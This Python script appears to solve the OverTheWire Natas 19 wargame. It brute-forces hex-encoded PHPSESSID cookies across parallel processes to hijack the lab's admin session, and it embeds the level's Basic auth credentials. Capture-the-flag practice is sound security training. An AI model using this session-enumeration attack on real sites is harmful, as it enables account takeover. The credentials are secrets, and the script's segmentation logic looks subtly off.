import os
import binascii
import requests
import functools
import multiprocessing

HEADERS = {"Authorization": "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="}
DATA = {"username": "admin", "password": "pass"}

session = requests.Session()
session.headers.update(HEADERS)


def enumerate_elements(elements, session):
    """ Perform requests for each element """
    for i in elements:
        phpsessid = binascii.hexlify(("{}-admin".format(i)).encode()).decode("ascii")
        cookies = {"PHPSESSID": phpsessid}
        response_text = session.post("http://natas19.natas.labs.overthewire.org/index.php",
                                     data=DATA, cookies=cookies).content.decode("utf-8")
        if "You are an admin." in response_text[790:]:
            print("{}: Hit! Admin session successfully hijacked!".format(i))
            exit(0)
        print("{}: Miss.".format(i))


def segment_elements(elements, n):
    base_segment_size = int(len(elements)/n)
    remainder = len(elements) % n
    larger_segments = [elements[i*(base_segment_size+1):(i+1)*(base_segment_size+1):1] for i in range(0, remainder)]
    smaller_segments = [elements[i*base_segment_size:(i+1)*base_segment_size:1] for i in range(remainder, n)]
    larger_segments.extend(smaller_segments)
    return larger_segments


def launch_attack():
    segments = segment_elements([i for i in range(1, 641)], os.cpu_count())
    session = requests.session()
    session.headers.update(HEADERS)
    with multiprocessing.Pool(os.cpu_count()) as process_pool:
        process_pool.map(functools.partial(enumerate_elements, session=session), segments)


if __name__ == "__main__":
    launch_attack()
